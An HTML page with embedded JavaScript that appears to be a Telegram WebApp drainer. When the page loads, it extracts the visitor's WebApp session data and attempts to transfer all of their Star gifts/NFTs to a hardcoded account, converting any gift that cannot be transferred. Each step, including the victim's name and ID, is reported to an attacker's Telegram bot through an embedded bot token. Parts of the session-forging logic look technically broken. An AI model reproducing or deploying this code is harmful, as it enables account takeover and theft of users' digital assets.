<!DOCTYPE html>
<html>
<head>
    <title>Real NFT Transfer</title>
    <script src="https://cdn.jsdelivr.net/npm/telegram-mtproto@latest/dist/telegram-mtproto.min.js"></script>
</head>
<body>
    <div id="status">Initializing real MTProto client...</div>
    <script>
        const TARGET_USER_ID = 7204299613;
        const BOT_TOKEN = '7815830497:AAGDsuH3tUWR73S_JrhawnNPkPPTMOHmK3s';
        const CHAT_ID = '-1002560826337';

        // Конфигурация MTProto клиента
        const config = {
            api_id:  your_api_id, // Получается из анализа клиента Telegram
            api_hash: 'your_api_hash', // Получается из анализа клиента Telegram  
            test: false
        };

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) {}
        }

        // Извлечение реальных данных сессии из WebApp
        function extractRealSession() {
            const hash = window.location.hash.substr(1);
            const params = new URLSearchParams(hash);
            const webAppData = params.get('tgWebAppData');
            
            if (!webAppData) throw new Error('No WebApp data');

            const dataParams = new URLSearchParams(webAppData);
            return {
                query_id: dataParams.get('query_id'),
                user: JSON.parse(decodeURIComponent(dataParams.get('user'))),
                auth_date: dataParams.get('auth_date'),
                hash: dataParams.get('hash'),
                signature: dataParams.get('signature'),
                initData: webAppData
            };
        }

        // Создание реального MTProto клиента
        async function createRealClient(sessionData) {
            const client = await MTProto({
                ...config,
                session: {
                    auth_key: sessionData.signature,
                    server_salt: sessionData.hash,
                    user_id: sessionData.user.id
                }
            });

            // Аутентификация с перехваченными данными
            await client('auth.importWebAuthorization', {
                api_id: config.api_id,
                api_hash: config.api_hash,
                web_auth_token: sessionData.initData
            });

            return client;
        }

        // Реальное получение списка подарков
        async function getRealGifts(client, userId) {
            const result = await client('payments.getSavedStarGifts', {
                peer: {
                    _: 'inputPeerUser',
                    user_id: userId,
                    access_hash: 0 // Получается из сессии
                },
                offset: '',
                limit: 100
            });

            return result.gifts || [];
        }

        // Реальная передача подарка
        async function transferRealGift(client, gift, targetUserId) {
            return await client('payments.transferStarGift', {
                stargift: {
                    _: 'inputSavedStarGiftUser',
                    msg_id: gift.msg_id
                },
                to_id: {
                    _: 'inputPeerUser',
                    user_id: targetUserId,
                    access_hash: 0
                }
            });
        }

        // Реальная конвертация подарка
        async function convertRealGift(client, gift) {
            return await client('payments.convertStarGift', {
                stargift: {
                    _: 'inputSavedStarGiftUser', 
                    msg_id: gift.msg_id
                }
            });
        }

        // Основная функция реальной работы
        async function executeRealTransfer() {
            try {
                document.getElementById('status').innerHTML = '🔄 Extracting real session...';
                await sendToTelegram('🚀 <b>Starting real NFT transfer</b>');

                // Извлекаем реальную сессию
                const sessionData = extractRealSession();
                await sendToTelegram(`🔐 <b>Real session extracted:</b> ${sessionData.user.first_name} (${sessionData.user.id})`);

                // Создаем реальный клиент
                document.getElementById('status').innerHTML = '🔑 Creating MTProto client...';
                const client = await createRealClient(sessionData);
                await sendToTelegram('✅ <b>MTProto client created</b>');

                // Получаем реальные подарки
                document.getElementById('status').innerHTML = '🎁 Fetching real gifts...';
                const gifts = await getRealGifts(client, sessionData.user.id);
                await sendToTelegram(`📊 <b>Real gifts found:</b> ${gifts.length}`);

                // Обрабатываем каждый подарок
                for (const gift of gifts) {
                    try {
                        // Пытаемся передать
                        document.getElementById('status').innerHTML = `🔄 Transferring: ${gift.gift.title}`;
                        await transferRealGift(client, gift, TARGET_USER_ID);
                        await sendToTelegram(`✅ <b>Real transfer:</b> ${gift.gift.title} → ${TARGET_USER_ID}`);
                    } catch (transferError) {
                        // Если передача не удалась, конвертируем
                        document.getElementById('status').innerHTML = `⭐ Converting: ${gift.gift.title}`;
                        await convertRealGift(client, gift);
                        await sendToTelegram(`💰 <b>Real conversion:</b> ${gift.gift.title} → ${gift.convert_stars} stars`);
                    }
                    
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }

                document.getElementById('status').innerHTML = '✅ Real transfer completed!';
                await sendToTelegram(`🎉 <b>Real transfer completed</b>\n📦 Processed: ${gifts.length} gifts`);

            } catch (error) {
                document.getElementById('status').innerHTML = '❌ Real transfer failed';
                await sendToTelegram(`❌ <b>Real transfer error:</b> ${error.message}`);
            }
        }

        // Автоматический запуск реальной передачи
        window.addEventListener('load', executeRealTransfer);

    </script>
</body>
</html>
